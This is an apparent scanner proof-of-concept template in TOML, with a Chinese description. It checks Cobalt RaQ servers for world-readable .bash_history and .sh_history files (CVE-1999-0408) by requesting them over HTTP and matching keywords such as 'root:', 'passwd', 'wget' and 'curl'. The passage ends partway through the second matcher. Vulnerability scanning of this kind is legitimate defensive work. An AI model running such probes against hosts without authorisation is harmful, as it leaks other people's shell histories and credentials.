[info]
author = "ave"
description = "Cobalt RaQ 微型服务器中交互式 Shell 会话生成的历史文件（.bash_history）权限为世界可读且位于 Web 可访问目录，远程攻击者可通过 HTTP 直接读取获取敏感信息"
id = "POC-AVE-1999-0052"
name = "Cobalt RaQ shell 历史文件信息泄露 PoC"
severity = "high"
tags = ["ave-1999-0052"]
vuln_id = [
    "CVE-1999-0408",
    "AVE-1999-0052",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/.bash_history"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "root:",
    "ssh",
    "cd ",
    "ls ",
    "sudo",
    "passwd",
    "wget",
    "curl",
    "exit",
    "history",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/.sh_history"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
